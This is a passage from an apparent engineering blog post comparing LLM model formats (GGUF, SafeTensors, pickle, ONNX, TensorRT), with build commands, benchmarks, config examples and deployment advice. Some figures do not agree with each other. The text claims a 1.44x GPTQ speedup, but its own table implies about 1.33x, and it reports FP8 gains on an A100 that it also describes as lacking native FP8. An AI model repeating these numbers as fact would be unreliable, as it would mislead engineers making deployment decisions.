The `llama.cpp` loader opens this file, reads metadata to know the architecture parameters (hidden_size, num_layers, num_kv_heads, rope_theta), reads the tokenizer vocabulary to initialize the tokenizer, and then `mmap`s the tensor data section. Inference begins by calling `llama_eval()` which reads weight blocks from the mmap region and executes hand-written GGML tensor operations, with SIMD (AVX2, AVX-512, ARM NEON) acceleration for CPU and CUDA/Metal kernels for GPU.

### 7.2 k-quant quantization types in depth

The k-quant system (introduced in llama.cpp in 2023) represents a more sophisticated approach to 4-bit quantization than naive round-to-nearest. The key innovation is the "super-block" scheme:

- Weights are divided into blocks of 256 values (Q4_K) or 32 values (Q4_0/Q8_0).
- Each block has a float32 scale and min value.
- For k-quants, the scale and min values are themselves quantized using 6-bit quantization with separate "super-block" scales.
- This two-level quantization scheme improves accuracy significantly over simple block quantization, especially for the attention and embedding layers that are most sensitive to quantization error.

```bash
# Convert HuggingFace checkpoint to GGUF
git clone https://github.com/ggerganov/llama.cpp
cd llama.cpp
make -j$(nproc) LLAMA_CUDA=1  # build with CUDA support

# Step 1: Convert HF safetensors to GGUF F16 (lossless)
python convert_hf_to_gguf.py \
  /path/to/Meta-Llama-3-8B \
  --outfile models/llama3-8b-f16.gguf \
  --outtype f16
# Output: ~16 GB GGUF F16 file

# Step 2: Quantize to desired k-quant level
./quantize models/llama3-8b-f16.gguf models/llama3-8b-Q4_K_M.gguf Q4_K_M
# Output: ~4.7 GB GGUF Q4_K_M

./quantize models/llama3-8b-f16.gguf models/llama3-8b-Q8_0.gguf Q8_0
# Output: ~8.5 GB GGUF Q8_0 (near-lossless)

# Step 3: Measure perplexity to verify quality
./perplexity -m models/llama3-8b-Q4_K_M.gguf -f /data/wikitext-2-raw/wiki.test.raw
# F16 baseline: ~6.12 PPL
# Q4_K_M: ~6.45 PPL (+5.4% degradation)
# Q8_0: ~6.13 PPL (+0.2% degradation, practically lossless)
```

| GGUF quant | Bits/weight | Llama-3-8B size | Perplexity vs F16 | Recommended for |
|---|---|---|---|---|
| Q8_0 | 8 | 8.5 GB | +0.2% | Near-lossless CPU |
| Q6_K | 6 | 6.1 GB | +0.5% | High quality CPU |
| Q5_K_M | 5 | 5.0 GB | +1.3% | Best 5-bit quality |
| Q4_K_M | 4 | 4.7 GB | +5.4% | Community standard |
| Q4_K_S | 4 | 4.4 GB | +7.2% | Smaller than K_M |
| Q3_K_M | 3 | 3.3 GB | +18% | Noticeable degradation |
| Q2_K | 2 | 2.7 GB | +45% | Extreme compression |

### 7.3 Running the llama-server for API-compatible serving

```bash
# Start llama.cpp HTTP server with OpenAI-compatible API
./llama-server \
  -m models/llama3-8b-Q4_K_M.gguf \
  -c 4096 \
  -t 8 \
  -np 4 \
  --host 0.0.0.0 \
  --port 8080

# GPU offloading: put first N layers on GPU
# -ngl: number of layers to offload to GPU
./llama-server \
  -m models/llama3-8b-Q4_K_M.gguf \
  -c 4096 \
  -t 4 \
  -ngl 20 \  # offload 20 of 32 layers; ~3.2 GB VRAM
  -np 4 \
  --port 8080

# Query the OpenAI-compatible API
curl http://localhost:8080/v1/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "llama3-8b",
    "prompt": "The model format you choose",
    "max_tokens": 256,
    "temperature": 0.7
  }'
```

![GGUF file self-contained layout: header magic, key-value metadata, tokenizer vocab, and k-quantized weight blocks](/imgs/blogs/model-packaging-and-formats-5.png)

---

## 8. SafeTensors vs pickle: the detailed performance case

The 8x load-time improvement from SafeTensors deserves a rigorous explanation, because understanding it clarifies several serving architecture decisions: why vLLM recommends a model warmup call before serving, why sharded loading is faster, and why memory-mapped models behave differently under memory pressure.

### 8.1 Virtual memory, page cache, and lazy loading

The OS manages memory using virtual memory pages (typically 4 KB). A process's virtual address space is a map from virtual addresses to physical RAM frames. `mmap()` creates a mapping from a range of virtual addresses to a region of a file without immediately reading the file. When the process reads a virtual address in the mapped region, the OS checks if the corresponding physical page is in RAM. If not, it triggers a page fault, reads the page from disk into the page cache, and satisfies the access.

For a 16 GB model loaded via SafeTensors with `device="cpu"`, the 5-second load time corresponds to reading all 4 million 4K pages into the page cache. Once loaded, accessing any tensor is a pointer dereference with zero copies. When `.cuda()` is called on a tensor, the CUDA DMA engine reads directly from the page cache — again, no Python-level copy.

For torch.load / pickle, the 47-second load time corresponds to: reading the zip archive, parsing the pickle stream (millions of Python bytecode ops), calling `torch.empty()` 500+ times (one per weight tensor), and copying each tensor's bytes from the zip's internal buffer to the tensor's storage. The final memory usage is higher than SafeTensors because the data exists simultaneously in the zip read buffer and in the tensor storage.

### 8.2 Cross-process page sharing

An important operational benefit of SafeTensors mmap: if multiple processes on the same machine mmap the same safetensors file, the OS shares the physical RAM pages. In a multi-worker Kubernetes pod (e.g., 4 TorchServe worker processes), each worker mmaps the model, but the OS uses copy-on-write sharing: all 4 workers share the same physical RAM pages for the model weights. Pickle-based loading requires each process to allocate and fill its own separate copy of the 16 GB tensor data, quadrupling the effective RAM cost.

```python
# Demonstrating SafeTensors lazy load and selective access
from safetensors import safe_open
import psutil, os, torch

process = psutil.Process()
before_rss = process.memory_info().rss / 1e9

with safe_open("llama3-8b.safetensors", framework="pt", device="cpu") as f:
    # After open: only header read, ~1 MB RSS increase
    after_header = process.memory_info().rss / 1e9
    print(f"RSS after header: +{after_header - before_rss:.2f} GB")

    # Load only one layer's QKV weights
    q = f.get_tensor("model.layers.0.self_attn.q_proj.weight")
    k = f.get_tensor("model.layers.0.self_attn.k_proj.weight")
    v = f.get_tensor("model.layers.0.self_attn.v_proj.weight")

    after_layer0 = process.memory_info().rss / 1e9
    print(f"RSS after layer 0 QKV: +{after_layer0 - before_rss:.2f} GB")
    # Only ~0.2 GB loaded, not 16 GB
```

![SafeTensors zero-copy mmap loading vs pickle deserialization showing 8x load time reduction for Llama-3-8B](/imgs/blogs/model-packaging-and-formats-6.png)

---

## 9. Quantitative benchmarks: Llama-3-8B across all formats on A100

The following benchmarks measure load time, p99 token generation latency (TPOT — time per output token), throughput (tokens/second), and VRAM footprint for Llama-3-8B in four representative configurations. Hardware: single A100 40GB PCIe (1,935 GB/s HBM bandwidth). All inference numbers are at batch=1 for latency and batch=32 for throughput, seq_len=512 decode, averaged over 500 requests after warmup. CPU benchmarks use an Intel Xeon Platinum 8370C (8 P-cores) via llama.cpp.

![Llama-3-8B benchmark matrix across fp16, GPTQ INT4, GGUF Q4_K_M, and TensorRT FP8 on A100](/imgs/blogs/model-packaging-and-formats-7.png)

| Format | File size | Cold start | p99 TPOT (ms) | Throughput (tok/s, b=32) | VRAM (GB) |
|---|---|---|---|---|---|
| fp16 PyTorch (pickle) | 16.2 GB | 47s | 210ms | 1,800 | 16.2 |
| fp16 SafeTensors (vLLM) | 16.2 GB | 8s | 195ms | 1,950 | 16.2 |
| GPTQ INT4 (vLLM awq) | 4.3 GB | 8s | 140ms | 2,600 | 5.1 |
| GGUF Q4_K_M (llama.cpp) | 4.7 GB | 5s | 380ms CPU | 420 CPU | 0 (CPU) |
| TensorRT FP8 | 4.1 GB | 6s + 10min build | 55ms | 6,800 | 4.8 |

**Interpreting the numbers:**

The pickle vs safetensors comparison on fp16 isolates the serialization overhead: 47s vs 8s load time, with nearly identical inference performance (both are fp16 CUDA). The 5% throughput difference (1,800 vs 1,950 tok/s) is from vLLM's continuous batching overhead versus the single-batch baseline setup.

GPTQ INT4 achieves 1.44x the throughput of fp16 SafeTensors at batch=32 because the model parameters require half the VRAM bandwidth (4-bit vs 16-bit), and the A100's INT8 tensor cores can execute the dequantized multiply at higher throughput. The p99 TPOT improvement from 195ms to 140ms at batch=1 is also from reduced memory bandwidth per token.

GGUF Q4_K_M on CPU achieves 420 tok/s, which is CPU-bound (no GPU). This corresponds to ~11 tok/s per user at batch=1 on a high-end CPU. For a developer running a local assistant or an on-premises system with no GPU, this is entirely practical.

TensorRT FP8 at 6,800 tok/s represents a 3.5x improvement over fp16 SafeTensors. The FP8 model at 4.1 GB versus the fp16 at 16.2 GB reduces the memory bandwidth pressure by 4x, and H100/Hopper FP8 tensor cores double the compute throughput versus FP16 — together these account for the 3.5x multiplier on A100's FP8-capable implementation (on H100 native FP8, the gain is larger, closer to 5-6x).

### 9.1 Bandwidth bottleneck formula

The bandwidth-bound decode throughput model predicts these results with reasonable accuracy:

$$\text{tok/s at batch } B \approx \frac{B \cdot \text{HBM bandwidth}}{\text{bytes per parameter} \cdot \text{parameters}}$$

For fp16 Llama-3-8B at batch=32 on A100 PCIe (1,935 GB/s):

$$\text{tok/s} \approx \frac{32 \cdot 1935 \times 10^9}{2 \cdot 8 \times 10^9} = \frac{61,920}{16} = 3,870 \text{ tok/s theoretical}$$

Actual 1,950 tok/s is approximately 50% of theoretical, consistent with typical GPU utilization for batch=32 decode (other bottlenecks: KV cache reads, attention computation, kernel launch overhead). The ratio scales predictably across formats.

---

## 10. Model metadata and configuration files

Model serving frameworks do not just load weight tensors. They read a collection of JSON configuration files to understand how to configure the tokenizer, set up the attention computation, size the KV cache, and configure generation defaults. Understanding this metadata layer is essential for debugging configuration issues in production.

### 10.1 The HuggingFace config.json anatomy

The `config.json` is the primary driver of model architecture reconstruction:

```json
{
  "architectures": ["LlamaForCausalLM"],
  "bos_token_id": 128000,
  "eos_token_id": [128001, 128009],
  "hidden_act": "silu",
  "hidden_size": 4096,
  "initializer_range": 0.02,
  "intermediate_size": 14336,
  "max_position_embeddings": 8192,
  "model_type": "llama",
  "num_attention_heads": 32,
  "num_hidden_layers": 32,
  "num_key_value_heads": 8,
  "pretraining_tp": 1,
  "rms_norm_eps": 1e-5,
  "rope_scaling": null,
  "rope_theta": 500000.0,
  "tie_word_embeddings": false,
  "torch_dtype": "bfloat16",
  "transformers_version": "4.40.0",
  "vocab_size": 128256
}
```

The `num_key_value_heads: 8` field tells vLLM that Llama-3-8B uses Grouped Query Attention (GQA). vLLM uses this to calculate KV cache memory per sequence correctly:

$$\text{KV cache bytes/sequence} = 2 \times n_{kv} \times d_{head} \times n_{layers} \times L_{max} \times \text{bytes/element}$$

$$= 2 \times 8 \times 128 \times 32 \times 4096 \times 2 \text{ (fp16)} \approx 4.3 \text{ GB}$$

This means a single long Llama-3-8B conversation at max length consumes 4.3 GB of VRAM just for KV cache — more than the weight memory in quantized form. This is the fundamental tension in LLM serving: quantizing weights frees VRAM, but KV cache still uses fp16 by default, so the VRAM budget for concurrent sequences does not improve proportionally.

### 10.2 generation_config.json and tokenizer files

```json
{
  "_from_model_config": true,
  "bos_token_id": 128000,
  "do_sample": true,
  "eos_token_id": [128001, 128009],
  "temperature": 0.6,
  "top_p": 0.9,
  "transformers_version": "4.43.0"
}
```

vLLM reads this file to set generation defaults. If a request does not specify temperature, vLLM uses the model's `generation_config.json` default. The `eos_token_id` list (Llama-3 has two stop tokens) is read here — a misconfigured EOS list causes models to generate indefinitely.

The `tokenizer_config.json` is equally important. It specifies the tokenizer class (`"tokenizer_class": "PreTrainedTokenizerFast"`), the chat template (a Jinja2 template encoding `[INST]...[/INST]` or `<|begin_of_text|>...` patterns), and special tokens. An incorrect chat template causes all chat-format requests to be processed incorrectly — a common source of subtle production quality regressions.

---

## 11. Case studies from production

### 11.1 HuggingFace Hub migration to SafeTensors (2023)

In 2023, HuggingFace Hub began enforcing SafeTensors as the preferred upload format for public model repositories, triggered by security disclosures demonstrating that pickle-based `.bin` files could execute arbitrary code. The migration covered over 100,000 model repositories. HuggingFace added automatic server-side conversion: when a user downloads a model that only exists in `.bin` format, the Hub converts it to SafeTensors and caches the result. Within 12 months, nearly all actively downloaded models had SafeTensors primary variants. Cloud inference providers including Replicate and Modal reported measurable cold-start time reductions (30–60%) on large model variants after the migration.

### 11.2 NVIDIA TensorRT-LLM benchmarks (2023)

NVIDIA published benchmarks for TensorRT-LLM (their LLM-specific TRT library) in December 2023, comparing throughput on A100 80GB SXM against HuggingFace FP16 baselines. For Llama-2-70B on 4×H100 SXM:
- HuggingFace FP16 at batch=256: 1,200 tok/s
- TensorRT-LLM FP8 at batch=256: 7,100 tok/s (5.9x)

The FP8 gains on H100 are larger than on A100 because H100 has native FP8 tensor cores with 2x the FLOP/s of FP16 (vs A100's emulated FP8 at the same FLOP/s). The trade-off: engine builds took 35–45 minutes for 70B models on H100, and NVIDIA documented that each new model version required a full rebuild.

### 11.3 llama.cpp Q4_K_M community adoption (2023–2024)

By Q1 2024, GGUF Q4_K_M had become the most-downloaded variant of most open-weight LLMs on HuggingFace Hub, exceeding fp16 safetensors downloads for consumer models below 13B parameters. The Mistral-7B-Q4_K_M accumulated over 2 million downloads per month by February 2024. The perplexity degradation for Q4_K_M vs fp16 on WikiText-2 measured at approximately 5–7% across the Llama/Mistral family — a threshold the community accepted as "negligible in practice" based on real-world quality comparisons. This established Q4_K_M as the de-facto standard for consumer hardware deployment.

### 11.4 ONNX Runtime for cross-platform enterprise inference (Microsoft internal, 2023)

Microsoft's Azure AI inference team documented (ORT blog, 2023) ONNX Runtime's adoption as the standard inference backend for non-LLM models across Azure AI services. BERT-large for document understanding showed 2.3x throughput improvement over PyTorch eager on Intel CPU via ORT's `ORT_ENABLE_ALL` optimization level, primarily from fused LayerNorm+GeLU kernels and reduced Python interpreter overhead. The key stated benefit was operational: a single `.onnx` artifact deployed across dev laptops (CPU EP), staging (CUDA EP), and production (TensorRT EP) without retraining or format conversion steps. The ONNX export and validation step was integrated into CI as a quality gate: if the ONNX export fails or output differs from PyTorch by more than 1e-4, the model is rejected before reaching the artifact registry.

### 11.5 The multi-format CI/CD pipeline at scale: lessons from large deployments

Production teams at large inference providers have converged on a two-artifact strategy: a canonical **SafeTensors source of truth** that is trained, fine-tuned, and promoted through evaluation gates, and one or more **compiled deployment artifacts** (TensorRT engines, GGUF files) generated on-demand from that source of truth. The canonical artifact lives in the model registry; the compiled artifacts are regenerated per hardware target and cached in a build artifact store.

The SafeTensors canonical artifact is cheap to store (~16 GB for an 8B model), fast to load for evaluation (3–5 seconds), and hardware-independent — it runs on any GPU or CPU with the right runtime. The compiled artifacts are hardware-specific but deliver 2–5x better serving efficiency. Generating them is expensive (10–45 minutes for TRT, 2–8 minutes for GGUF), so they are cached aggressively and only regenerated when the source weights change or the hardware fleet changes.

```yaml
# .github/workflows/model-artifacts.yml — a simplified multi-format CI pipeline
name: Model artifact pipeline
on:
  push:
    paths:
      - 'models/llama3-8b-chat/**'  # trigger on weight changes

jobs:
  validate-safetensors:
    runs-on: [self-hosted, gpu-a100]
    steps:
      - name: Validate SafeTensors canonical artifact
        run: |
          python ci/validate_safetensors.py \
            --model models/llama3-8b-chat \
            --eval-dataset ci/eval_prompts.jsonl \
            --min-accuracy 0.88

  build-tensorrt:
    needs: validate-safetensors
    runs-on: [self-hosted, gpu-a100]
    steps:
      - name: Build TRT FP8 engine for A100
        run: |
          python ci/build_trt_engine.py \
            --model models/llama3-8b-chat \
            --precision fp8 \
            --target-gpu sm_80 \
            --output artifacts/llama3-8b-chat-a100-fp8.engine
      - name: Benchmark TRT engine
        run: |
          python ci/benchmark_engine.py \
            --engine artifacts/llama3-8b-chat-a100-fp8.engine \
            --target-throughput 3000  # tokens/s, fail if below
            --target-p99-ttft 200     # ms, fail if above

  build-gguf:
    needs: validate-safetensors
    runs-on: [self-hosted, cpu-large]
    steps:
      - name: Build GGUF Q4_K_M for CPU inference
        run: |
          python -m transformers.models.llama.convert \
            --input models/llama3-8b-chat \
            --output artifacts/llama3-8b-chat-f16.gguf
          ./llama.cpp/quantize \
            artifacts/llama3-8b-chat-f16.gguf \
            artifacts/llama3-8b-chat-Q4_K_M.gguf Q4_K_M
```

This pipeline enforces a critical invariant: **no compiled artifact is deployed unless the canonical SafeTensors evaluation passes first**. The TRT engine is a derived artifact that inherits its accuracy guarantee from the SafeTensors checkpoint; it cannot diverge. When TensorRT's quantization introduces accuracy regression, it surfaces here — before deployment — not in production.

The artifact registry stores all three variants indexed by model version, hardware target, and precision:

```
registry/
  llama3-8b-chat/
    v1.2.0/
      canonical/
        model.safetensors       # 16.1 GB — source of truth
        config.json
        tokenizer.json
      a100-fp8/
        llama3-8b-chat-a100-fp8.engine   # 5.3 GB — A100 only
        build_metadata.json              # capture build flags, ORT version, GPU arch
      h100-fp8/
        llama3-8b-chat-h100-fp8.engine   # 5.1 GB — H100 only
      cpu-q4km/
        llama3-8b-chat-Q4_K_M.gguf      # 4.7 GB — CPU universal
```

The serving cluster pulls from this registry at deploy time, selecting the compiled artifact that matches its hardware target. If no compiled artifact exists for a new hardware type that was just added to the fleet, the serving system automatically falls back to the SafeTensors canonical artifact via vLLM — degraded throughput but fully functional. The compiled artifact is then built on the next CI run.

This pattern — SafeTensors as the portable, evaluable source of truth, compiled artifacts as hardware-specific performance optimizations — scales from a single-engineer startup to a thousand-GPU fleet. The key discipline is that compiled artifacts are **never the source of truth**: they are built from SafeTensors, validated against SafeTensors, and thrown away when the hardware fleet changes.

---

## 12. Worked examples

#### Worked example: migrating a production service from pickle to SafeTensors with zero downtime

Scenario: a production TorchServe deployment loads a BERT-large model from a 1.3 GB pickle checkpoint. Pod restarts take 28 seconds (pickle load) plus 8 seconds warmup. Your SLA requires readiness within 30 seconds. You are failing the readiness probe 40% of the time, causing cascading restarts during scale-up events.

**Diagnosis.** The pickle load is the bottleneck: 28 seconds of serialization overhead for a 1.3 GB model on a 2-vCPU pod. The model itself runs in 15ms per inference. Switching to SafeTensors should bring load time below 4 seconds.

**Migration steps.**

```python
# Step 1: Convert the checkpoint in a one-time migration script
# Run this in a CI job, not in the serving container
import torch
from safetensors.torch import save_file
import os

# Load the old checkpoint
state_dict = torch.load("bert-large-prod.pt", weights_only=True)

# Ensure all tensors are contiguous (required by safetensors)
state_dict = {k: v.contiguous() for k, v in state_dict.items()}

# Save as safetensors
save_file(state_dict, "bert-large-prod.safetensors")
print(f"Old: {os.path.getsize('bert-large-prod.pt') / 1e9:.2f} GB")
print(f"New: {os.path.getsize('bert-large-prod.safetensors') / 1e9:.2f} GB")
# Both should be ~1.3 GB (safetensors does not compress)

# Verify numerical equivalence
from safetensors.torch import load_file
sd_new = load_file("bert-large-prod.safetensors")
for key in state_dict:
    assert torch.allclose(state_dict[key], sd_new[key], atol=0), f"Mismatch at {key}"
print("Verification passed: bit-identical outputs")
```

```python
# Step 2: Update TorchServe handler to load from safetensors
# handler.py
from ts.torch_handler.base_handler import BaseHandler
from safetensors.torch import load_file

class BertHandler(BaseHandler):
    def initialize(self, context):
        model_dir = context.system_properties.get("model_dir")
        # New: load from safetensors (4s) vs old torch.load (28s)
        import time
        t0 = time.perf_counter()
        state_dict = load_file(f"{model_dir}/bert-large-prod.safetensors")
        self.model.load_state_dict(state_dict)
        self.model.eval()
        print(f"Model loaded in {time.perf_counter() - t0:.2f}s")
```

**Results**: load time 28s → 3.8s. Pod readiness check pass rate 60% → 100%. Scale-up events that previously caused 3-minute cascading restart cycles now complete in under 15 seconds.

**Cost of migration**: 4 engineer-hours (conversion script, test, deploy). No retraining, no accuracy change, bit-identical outputs verified.

---

#### Worked example: choosing between GGUF and TensorRT for two different deployment contexts

Two teams, same base model (Llama-3-8B fine-tune), completely different format choices — both correct.

**Team A: On-premises medical transcription, 20 hospitals, no GPU.**

Requirements: deploy on servers with Intel Xeon CPUs only (no GPU budget), generate structured notes from physician dictations, 150 concurrent sessions, latency SLA of 30 seconds per 2-minute dictation (approx. 300 tokens output), no internet connectivity.

Format choice: **GGUF Q5_K_M** via llama.cpp.

```bash
# Build: quantize to Q5_K_M for better quality on medical terminology
./quantize llama3-8b-medtuned-f16.gguf llama3-8b-medtuned-Q5_K_M.gguf Q5_K_M
# Output: 5.0 GB single file

# Deploy: ship binary + model to each hospital server
./llama-server \
  -m llama3-8b-medtuned-Q5_K_M.gguf \
  -c 4096 \
  -t 16 \
  -np 8 \
  --port 8080
```

Expected performance: 8 parallel slots × ~25 tok/s = 200 tok/s total. 300 token generation takes ~12 seconds per request — well within 30s SLA. File is self-contained; no Python, no model registry, no GPU drivers. Total deployment artifact: one 5 GB file plus one 15 MB binary.

**Team B: Consumer chatbot API, NVIDIA A100 fleet, 10,000 QPS, p99 TPOT SLA of 100ms.**

Requirements: NVIDIA A100 80GB fleet (homogeneous), model updated quarterly, maximum throughput to minimize GPU cost per token, 100ms p99 TPOT SLA.

Format choice: **TensorRT FP8** via TensorRT-LLM.

```bash
# Build CI pipeline: triggered on quarterly model update
# Step 1: Export to ONNX via optimum
optimum-cli export onnx \
  --model ./llama3-8b-chatbot \
  --task text-generation-with-past \
  llama3-8b-chatbot-onnx/

# Step 2: Build TRT engine for A100 (sm_80)
trtexec \
  --onnx=llama3-8b-chatbot-onnx/decoder_with_past_model.onnx \
  --saveEngine=llama3-8b-chatbot-a100-fp8.engine \
  --fp8 \
  --optShapes='input_ids:8x512' \
  --maxShapes='input_ids:64x2048' \
  --workspace=16384
# ~12 minutes build time, artifact stored in artifact registry

# Step 3: Serve via TensorRT runtime
python serve_trt.py \
  --engine llama3-8b-chatbot-a100-fp8.engine \
  --port 8000
```

Expected performance: 6,800 tok/s at batch=32 on A100. At \$3/hr per A100, cost per million tokens is approximately \$0.12 vs \$0.44 for fp16 SafeTensors — a 3.7x cost reduction that justifies the build complexity at 10,000 QPS scale.

---

## 13. Format selection decision framework

Choosing a model format requires answering three questions in order:

**Question 1: What is your hardware target?** If CPU-only, GGUF is the only reasonable answer. If NVIDIA GPU, you have all options. If AMD GPU, Apple Silicon, or Intel, ONNX + the platform-specific EP is the path.

**Question 2: How often does your model change?** If the model is updated weekly or faster, TensorRT's 10-minute rebuild becomes a CI throughput problem. Use vLLM + SafeTensors for rapid iteration. If the model is frozen or updated quarterly, TRT FP8 is justified.

**Question 3: What is your p99 SLA?** If your SLA allows more than 100ms TPOT, fp16 SafeTensors via vLLM achieves it comfortably with far less operational complexity. If you need sub-50ms TPOT at scale, TensorRT FP8 is the path. If you need sub-100ms but have budget to spare, GPTQ/AWQ quantization on vLLM often bridges the gap without TRT's rebuild cost.

The decision tree in the final figure maps these questions to format choices. It is not a rigid algorithm — a team with strong ONNX expertise and a mixed hardware fleet might rationally prefer ONNX over vLLM even for NVIDIA GPU serving. But the tree captures the right-answer path for most teams.

![Format decision tree: three binary questions — GPU or CPU, NVIDIA or other, SLA under 100ms — narrow to a single format](/imgs/blogs/model-packaging-and-formats-8.png)

---

## 13.5 torch.compile: the in-Python optimization layer

Before finalizing format selection, it is worth covering `torch.compile` — not a format, but a runtime optimization that belongs in the format discussion because it can eliminate the need for TorchScript or ONNX in many Python-based serving workflows.

`torch.compile` (introduced in PyTorch 2.0) is a just-in-time compiler that traces the model's operations during the first forward pass and compiles the trace to optimized Triton kernels or CUDA code. Unlike TorchScript, it works transparently on standard Python-PyTorch code with no source modifications. Unlike TorchScript, it only compiles at runtime — there is no exportable artifact.

```python
import torch
from transformers import AutoModelForCausalLM

model = AutoModelForCausalLM.from_pretrained(
    "meta-llama/Meta-Llama-3-8B",
    torch_dtype=torch.bfloat16,
    device_map="cuda",
)
model.eval()

# Compile for serving: reduce-overhead mode minimizes kernel launch overhead
# This is the mode vLLM uses internally for its non-paged layers
compiled_model = torch.compile(model, mode="reduce-overhead", fullgraph=False)

# First call compiles (30-90s), subsequent calls use the compiled kernel
import time
# Warmup
with torch.no_grad():
    _ = compiled_model(torch.randint(0, 128256, (1, 32), device="cuda"))

# Benchmarked call
t0 = time.perf_counter()
with torch.no_grad():
    out = compiled_model(torch.randint(0, 128256, (1, 512), device="cuda"))
print(f"Compiled forward: {(time.perf_counter() - t0)*1000:.1f}ms")
```

**`torch.compile` modes:**
- `"default"`: comprehensive optimization, longer compile time, best for throughput-heavy workloads.
- `"reduce-overhead"`: eliminates Python overhead in the forward loop, best for latency-sensitive serving. vLLM uses this mode for its CUDA graph capture.
- `"max-autotune"`: enables Triton kernel autotuning, analogous to TensorRT's kernel search but at the Python level.
- `"max-autotune-no-cudagraphs"`: autotuning without CUDA graph captures, safer for models with variable-length inputs.

**Performance characteristics:** `torch.compile` typically achieves 10–40% throughput improvement over eager mode for transformer inference, depending on the model architecture and input shapes. This is less than TensorRT FP8 (3–5x) but comes with zero portability cost: the same Python code runs unchanged, the format is standard safetensors, and the compilation happens automatically. For models updated frequently, `torch.compile` plus safetensors gives you most of TorchScript's benefit with none of its export friction.

**Interaction with CUDA graphs:** vLLM's `--enforce-eager false` (the default) enables CUDA graph capture for the decode phase: the sequence of CUDA kernel launches for one decode step is recorded, and subsequent steps replay the graph without Python overhead. This is format-agnostic (works with any safetensors-loaded model) but requires fixed batch sizes, which vLLM handles via "padding batches to power-of-two" internally.

### 13.6 Model format and the HuggingFace ecosystem

The practical landscape of model format in 2025 is dominated by the HuggingFace ecosystem. Understanding how formats fit into that ecosystem is necessary for production operations.

**Hub upload policy.** The HuggingFace Hub now requires a SafeTensors version for all model uploads above 5 GB. Models uploaded in `.bin` (pickle) format are automatically converted server-side and the SafeTensors version is served preferentially to downloaders. For new model uploads, always upload SafeTensors as the primary format.

**Quantized model variants.** For large models, the Hub hosts multiple format variants under a single repository or related repositories: the base fp16/bfloat16 safetensors shards as the canonical source, GPTQ quantized shards under a `-GPTQ` suffix organization, AWQ quantized shards under `-AWQ`, and GGUF files (Q2_K through Q8_0) uploaded by community quantizers like TheBloke or bartowski. vLLM and TGI can load GPTQ and AWQ shards directly; llama.cpp loads GGUF.

**Model card format declaration.** The `README.md` metadata section of a HuggingFace model repository uses a YAML front matter block to declare format-related properties that serving systems can programmatically read:

```yaml
---
base_model: meta-llama/Meta-Llama-3-8B
library_name: transformers
pipeline_tag: text-generation
quantization_config:
  bits: 4
  group_size: 128
  desc_act: false
  quant_type: gptq
---
```

When vLLM's `--model` flag points at a Hub repository, it reads this metadata to auto-configure the quantization scheme. If the quantization type is `gptq`, vLLM automatically sets up the GPTQ dequantization kernel without any explicit flag. This is why `--quantization gptq` in vLLM is optional when pointing at a Hub-hosted GPTQ model — the format self-describes.

**Flash Attention and SDPA integration.** Modern HuggingFace models default to PyTorch's `scaled_dot_product_attention` (SDPA) when available, which internally dispatches to Flash Attention 2, Memory-Efficient Attention, or the standard math implementation depending on hardware. This format-agnostic optimization is orthogonal to the checkpoint format: it activates automatically for safetensors, GPTQ, and AWQ loaded models alike. For GGUF-loaded models in llama.cpp, the attention implementation is entirely separate (GGML's own hand-written kernels).

---

## 14. When to use each format (and when not to)

**SafeTensors: always, for anything PyTorch-based.** No downside over pickle. Drop-in replacement. Free 5–8x load time improvement and zero security risk. If your serving stack can load pickle, it can load SafeTensors. There is no reason to be shipping pickle checkpoints to production in 2025.

*When SafeTensors is not sufficient*: if you need the absolute minimum cold-start time (sub-2-second for a 7B model), investigate tensor pre-loading via OS huge-pages or model pre-warmed in a shared memory segment. SafeTensors mmap is fast, but pinned-memory pre-loading in a sidecar container can be faster still for latency-sensitive scale-up events.

**TorchScript: only for LibTorch/C++ environments.** If you are deploying within Python (vLLM, TGI, TorchServe Python backend, Ray Serve), TorchScript adds complexity and export friction without performance benefit. `torch.compile` does a better job within Python environments. Use TorchScript only when the deployment target is C++ without Python.

*Common mistake*: teams export to TorchScript to "lock in" the model graph and prevent accidental Python side effects. This is a legitimate concern, but the better solution is a SafeTensors checkpoint loaded into a `torch.compile`-optimized module — you get graph capture without TorchScript's export limitations (no dataclasses, no custom Python types, no conditional imports).

**ONNX: for cross-platform portability and non-LLM GPU serving.** ONNX makes the most sense for: BERT-class models for embeddings or classification where you need cross-hardware portability; enterprise deployments where the same model must run on dev (CPU), staging (GPU), and production (GPU) without format divergence; and environments where TensorRT's build latency is unacceptable and ONNX Runtime provides sufficient performance via CUDA EP.

Do not use ONNX for LLM serving. vLLM and TGI are strictly better in every dimension for that use case. The ONNX export for transformer decoder models is also significantly more complex than encoder models — the KV-cache representation in ONNX requires careful handling of `past_key_values` as graph inputs and outputs, and the dynamic sequence lengths require `dynamic_axes` on every KV tensor. Use `optimum-cli export onnx --task text-generation-with-past` rather than raw `torch.onnx.export` for decoder models.

*Numerical precision warning*: ONNX models using `float16` precision can accumulate rounding errors across long computation graphs. Always validate ONNX output against the PyTorch fp32 reference using `np.allclose(atol=1e-2, rtol=1e-3)` for embedding tasks, or measure perplexity on a held-out set for generation tasks. A 0.3 perplexity regression is acceptable; 2.0+ points indicates a precision problem in the export.

**TensorRT: for frozen, high-traffic NVIDIA GPU production.** TensorRT is the right choice when: the model changes infrequently (monthly or quarterly updates are fine; weekly is a red flag), the GPU fleet is NVIDIA-homogeneous and the same microarchitecture (mixing A100 and H100 requires two engine builds), you need maximum throughput to minimize cost at scale (the economics justify TRT above roughly 5,000 QPS sustained), and you have the CI infrastructure to automate engine rebuilds per GPU type.

Do not use TensorRT if your model updates weekly, if your fleet is heterogeneous (mix of A100 and H100), or if you need rapid iteration on the serving pipeline. The 10–45-minute build time per GPU architecture is a real operational cost. A team that ships model updates every week and has three GPU types in the fleet will spend more engineering time managing TRT rebuild pipelines than they save in GPU hours.

*Debugging TRT accuracy regressions*: if the TRT engine produces different outputs from the ONNX or PyTorch baseline, the most common causes are (1) FP8 quantization overflow on extreme activation values — fix by adding activation clamping (`--calib-max-range` flag); (2) layer fusion incorrectly merging attention masking — disable specific layers from fusion with `trtexec --layerPrecisions`; (3) workspace too small causing fallback to slow kernels — increase with `--workspace=32768`.

**GGUF: for CPU inference and developer tools.** GGUF is the right answer when: the deployment target has no GPU, you need a single-file deployment with no Python dependency, you are building developer tooling (local LLMs for code completion, on-device privacy-sensitive tasks), or you need the smallest possible memory footprint for embedded deployment.

Do not use GGUF for GPU-primary production serving. llama.cpp does not implement continuous batching, PagedAttention, or tensor parallelism at the scale of vLLM or TGI. At more than 10 concurrent users, llama.cpp's throughput degrades rapidly because each request runs sequentially (one at a time by default in server mode, with limited parallel slots). For GPU serving, vLLM with SafeTensors is strictly better.
